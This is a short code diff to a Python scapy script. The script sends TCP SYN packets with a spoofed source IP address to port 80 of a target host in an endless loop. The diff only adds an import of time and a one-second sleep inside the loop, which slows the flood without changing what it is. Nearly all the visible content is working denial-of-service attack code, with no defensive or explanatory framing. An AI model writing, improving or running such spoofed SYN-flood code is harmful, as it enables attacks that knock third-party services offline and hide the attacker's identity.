@@ -19,6 +19,7 @@
 # # send(packet, count=10)  # Send 10 packets
 
 from scapy.all import *
+import time
 
 # Define the target and spoofed IP
 target_ip = "www.example.com"
@@ -29,3 +30,4 @@ target_port = 80
 while True:
     packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
     send(packet, count=10)# Send 10 packets
+    time.sleep(1)
